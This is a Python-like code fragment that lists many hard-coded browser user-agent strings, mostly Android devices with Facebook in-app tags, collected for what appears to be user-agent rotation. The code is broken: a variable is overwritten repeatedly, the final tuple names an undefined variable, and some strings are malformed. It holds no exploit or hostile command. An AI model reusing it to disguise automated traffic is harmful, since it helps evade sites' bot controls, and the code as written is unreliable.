ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U1 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918W Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.67 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S918B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.15 Mobile Safari/537.3",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928U1 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/460.0.0.34.89;]",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/461.0.0.47.85;]",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.8 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/461.0.0.47.85;] [FB_IAB/FB4A;FBAV/461.0.0.47.85;]",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S9280 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.2 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928W Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/459.1.0.42.84;]",]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928U1 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/457.0.0.54.84;]"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928W Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/460.0.0.34.89;]"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/461.0.0.47.85;]"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]"]
ua =["Mozilla/5.0 (Linux; U; Android 14; zh-Hans-CN; SM-S9280 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Quark/7.0.1.591 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928W Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/461.0.0.47.85;] FBNV/1"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928W Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/460.0.0.34.89;]"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/455.0.0.44.88;]"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]"]
cc =["Mozilla/5.0 (Linux; Android 5.0.2; SM-T530 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 5.0.2; SM-G530FZ Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 5.0.2; SM-G530FZ Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 5.0.2; SM-T530 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 5.1.1; SM-J105F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 GSA/5.10.32.19.arm"]
xx =["Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J111F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 8.1.0; SM-J530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG-SM-G935A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36 GSA/10.20.3.21.arm"]
ua =["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36v",]
ua = ["Mozilla/5.0 (Linux; Android 12; moto g stylus 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ['Mozilla/5.0 (Linux; Android 12; moto g power (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',]
ua = ["Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ['Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36']
ua = ['Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36']
ua = ['Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36']
ua = ['Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36']
ua = ['Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1']
ua = ['Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1']
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",]
ua = ["Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",]
ua = ["Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",]
ua = ["Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",]
ua = ['Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36']
ua = ['Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36']
ua = ['Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36']
ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',]
ua = ['Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36',]
ua = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',]
ua = ['Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',]
ua = ['Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',]
ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',]
ua = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',]
ua = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1;',]
ua = ['Mozilla/5.0 (iPod; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1',]
ua = ['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36',]
ua = ['Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',]
ua = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',]
ua = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36',]
ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',]
ua = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',]
ua = ['Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',]
ua = ['Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',]
ua = ['Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19',]
ua = ['Mozilla/5.0 (X11; CrOS i686 1660.57.0) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.46 Safari/535.19',]
ua = ['Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.803.0 Chrome/14.0.803.0 Safari/535.1',]
ua = ['Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41',]
ua = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1',]
ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',]
ua = ['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0',]
ua = ['Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0',]
ua = ['Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0',]
ua = ['Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Android 7.0; Mobile; rv:62.0) Gecko/62.0 Firefox/62.0',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4',]
ua = ['Mozilla/5.0 (Linux; Android 7.1.2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/3.0 Chrome/59.0.3017.125 Safari/537.36',] 
ua = ['FBAN/FB4A:FBAV/269.0.0.27.121;FBBV/2730509;[FBAN/FB4A;FBAV/269.0.0.27.121;FBBV/2730509;FBDM/{density=2.0,width=1080,height=1280};FBLC/en_US;FBRV/7058966804;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a;]',]
sd=(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv)
ugen.append(sd)
#_______________##____________#
a="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
b="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko"
c="Mozilla/5.0 (Linux; U; Android 4.4.2; id; SM-G900 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.2.467 U3/0.8.0 Mobile Safari/534.30"
d="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko"
e="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko"
f="Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.517"
g="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
h="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
i="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
j="Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36"
k="Mozilla/5.0 (Linux; Android 6.0.1; SM-G928F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/109.0.0.15.71;]"
l="Mozilla/5.0 (Linux; Android 5.0.2; SM-G530FZ Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
m="Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
n="Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
o="Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:47.0) Gecko/20100101 Firefox/47.0"
p="Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0"
q="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0"
r="Mozilla/5.0 (compatible; PaperLiBot/2.1; http://support.paper.li/entries/20023257-what-is-paper-li)"
s="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7"
t="Mozilla/5.0 (X11; CrOS x86_64 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36"
u="Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0"
v="Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1"
w="Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
x="Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
y="Mozilla/5.0 (X11; CrOS armv7l 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36"
z="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
aa="Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
bb="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko"
cc="Mozilla/5.0 (Linux; Android 5.0.2; SM-T530 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36"
dd="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.50"
ee="Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0E; InfoPath.1)"
ff="Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
gg="Mozilla/5.0 (compatible; ecoresearch/0.9; +http://www.ecoresearch.net)"
hh="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
ii="Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0"
jj="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
kk="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
ll="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
mm="Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/FBIOS;FBAV/78.0.0.40.70;FBBV/48784289;FBRV/0;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBCR/OrangeFrance;FBID/phone;FBLC/fr_FR;FBOP/5]"
nn="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0"
oo="Mozilla/5.0 (X11; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0"
pp="Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
qq="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0"
rr="Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 Iceweasel/3.0.3 (Debian-3.0.3-3)"
ss="Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0"
tt="Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0"
uu="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
